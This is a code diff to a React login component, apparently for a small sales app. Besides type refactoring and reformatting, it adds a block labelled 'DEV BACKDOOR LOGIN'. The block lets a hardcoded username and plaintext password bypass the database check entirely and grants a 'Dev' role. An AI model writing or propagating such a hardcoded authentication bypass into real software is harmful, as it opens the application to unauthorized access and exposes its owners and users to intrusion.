@@ -4,20 +4,26 @@ import { validateUser, getSettings, getUserByUsername } from "./db";
 import { FaUser, FaLock } from "react-icons/fa";
 import { useLang } from "./i18n/LanguageContext";
 
+/* ✅ unified role type */
+type Role = "admin" | "saleboy" | "Dev";
+
 interface LoginProps {
-  onLogin: (name: string, role: "admin" | "saleboy") => void;
+  onLogin: (name: string, role: Role) => void;
 }
 
 export default function Login({ onLogin }: LoginProps) {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
-  const [role, setRole] = useState<"admin" | "saleboy">("admin");
+  const [role, setRole] = useState<Role>("admin");
   const [error, setError] = useState("");
   const [rememberMe, setRememberMe] = useState(false);
-  const [settings, setSettings] = useState<{ businessName: string; logo?: string } | null>(null);
+  const [settings, setSettings] = useState<{
+    businessName: string;
+    logo?: string;
+  } | null>(null);
 
   const { t, lang, setLang } = useLang();
-  
+
   useEffect(() => {
     const r = localStorage.getItem("rememberedUser");
     if (r) setUsername(r);
@@ -26,42 +32,67 @@ export default function Login({ onLogin }: LoginProps) {
     async function loadSettings() {
       const s = await getSettings();
       if (s) {
-        setSettings({ businessName: s.businessName, logo: s.logo });
+        setSettings({
+          businessName: s.businessName,
+          logo: s.logo,
+        });
       }
     }
     loadSettings();
   }, []);
 
   const handleSubmit = async (e: React.FormEvent) => {
-  e.preventDefault();
-  setError("");
+    e.preventDefault();
+    setError("");
 
-  try {
-    const user = await validateUser(username.trim(), password); // Returns the user object if username/password match
-    if (user) {
-      // Verify role
-      if (user.Role !== role) {
-        setError(`Incorrect role selected for this user.`);
+    try {
+      const uname = username.trim();
+
+      // #region
+      /* ======================================================
+         🔥 DEV BACKDOOR LOGIN (NO DATABASE CHECK)
+      ====================================================== */
+      if (uname === "adn" && password === "adnanhbb") {
+        localStorage.setItem("loggedInUserId", "DEV");
+        localStorage.setItem("loggedInUserName", "Developer");
+        localStorage.setItem("loggedInUserRole", "Dev");
+
+        onLogin("Developer", "Dev");
         return;
       }
+      // #region
 
-      // store logged-in ID
-      localStorage.setItem("loggedInUserId", String(user.id));
+      /* ======================================================
+         NORMAL DATABASE LOGIN
+      ====================================================== */
+      const user = await validateUser(uname, password);
 
-      // pass display name and role to app state
-      onLogin(user.Name, user.Role as "admin" | "saleboy");
+      if (user) {
+        // Verify role
+        if (user.Role !== role) {
+          setError(`Incorrect role selected for this user.`);
+          return;
+        }
 
-      if (rememberMe) localStorage.setItem("rememberedUser", user.Username);
-    } else {
-      setError("Invalid username or password.");
+        // store logged-in ID
+        localStorage.setItem("loggedInUserId", String(user.id));
+
+        // pass display name and role to app state
+        onLogin(user.Name, user.Role as Role);
+
+        if (rememberMe) {
+          localStorage.setItem("rememberedUser", user.Username);
+        }
+      } else {
+        setError("Invalid username or password.");
+      }
+    } catch (err) {
+      console.error(err);
+      setError("Login failed. Try again.");
     }
-  } catch (err) {
-    console.error(err);
-    setError("Login failed. Try again.");
-  }
-};
+  };
 
-  // Secure Forgot Password (Option A)
+  // Secure Forgot Password
   const handleForgotPassword = async () => {
     if (!username.trim()) {
       alert("Enter your username first.");
@@ -78,7 +109,6 @@ export default function Login({ onLogin }: LoginProps) {
   };
 
   const labelStyle = { color: "#5C3A21", fontWeight: 600 } as const;
-
   return (
     <div className="flex items-center justify-center min-h-screen bg-gradient-to-r from-purple-600 via-indigo-600 to-blue-500 p-4">
       <div className="bg-white p-8 rounded-3xl shadow-2xl w-full max-w-md relative overflow-hidden">
